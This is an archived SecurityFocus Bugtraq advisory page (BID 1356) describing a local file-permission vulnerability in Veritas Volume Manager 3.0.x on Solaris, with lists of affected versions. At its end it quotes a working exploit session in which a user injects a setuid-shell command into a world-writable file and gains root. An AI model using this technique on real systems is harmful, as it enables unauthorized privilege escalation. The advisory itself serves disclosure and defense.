@@ -1,0 +1,202 @@
+#bid1356<p><b><span style="font-size: 18pt;">Veritas Volume Manager 3.0.x File Permission Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1356/info">info</a><br><a href="http://www.securityfocus.com/bid/1356/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1356/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1356/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1356/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1356
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 16 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 16 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was posted to the Bugtraq mailing list on June 16, 2000 by Dixie Flatline &lt;echo8@whip.twistedpair.ca&gt;
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Veritas Software Volume Manager 3.0.4 <br/>
+<span class="related">
+						
+							-
+						
+						Sun Solaris 2.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  2.6<br/>
+</span>
+					
+				
+					Veritas Software Volume Manager 3.0.3 <br/>
+<span class="related">
+						
+							-
+						
+						Sun Solaris 2.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  2.6<br/>
+</span>
+					
+				
+					Veritas Software Volume Manager 3.0.2 <br/>
+<span class="related">
+						
+							-
+						
+						Sun Solaris 2.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  2.6<br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Veritas Software Volume Manager 3.1  Beta<br/>
+<span class="related">
+						
+							-
+						
+						Sun Solaris 2.5.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  8_sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  7.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Sun Solaris  2.6<br/>
+</span>
+					
+				
+					Sun Solaris  8_sparc<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	From the example posted to Bugtraq:<br/># append our malicious commands to the world-writeable file<br/><br/>foo@bar&gt; id<br/>uid=500(foo) gid=25(programmers)<br/>foo@bar&gt; ls -alt /var/opt/vmsa/logs/.server_pids<br/>-rw-rw-rw-   1 root     root          27 Jun  8 16:06 /var/opt/vmsa/logs/.server_pids<br/>foo@bar&gt; cat &gt;&gt; /var/opt/vmsa/logs/.server_pids<br/>cp /bin/ksh /var/tmp; chmod 4755 /var/tmp/ksh <br/>^D<br/>foo@bar&gt; cat /var/opt/vmsa/logs/.server_pids    <br/>kill 328<br/>kill 329 <br/>kill 337<br/>cp /bin/ksh /var/tmp; chmod 4755 /var/tmp/ksh<br/>foo@bar&gt;<br/><br/># wait for root to stop the server manually<br/><br/>root@bar&gt;  /opt/VRTSvmsa/bin/vmsa_server -k<br/>Stopping VERITAS VM Storage Administrator Server<br/>root@bar&gt; ls -alt /var/tmp<br/>total 406<br/>drwxrwxrwt   2 sys      sys          512 Jun  8 17:46 .<br/>-rwsr-xr-x   1 root     other     192764 Jun  8 17:46 ksh <br/>-rw-------   1 root     root         387 Jun  8 17:46 wsconAAArqayVa:0.0 <br/>drwxr-xr-x  26 root     sys          512 Jun  8 09:51 ..<br/><br/># as an unprivileged user, run the suid-root shell we just created...     <br/><br/>foo@bar&gt; /var/tmp/ksh <br/># id<br/>uid=500(foo) gid=25(programmers) euid=0(root)<br/>#
+	
+		<ul>
+</ul>
+</div>
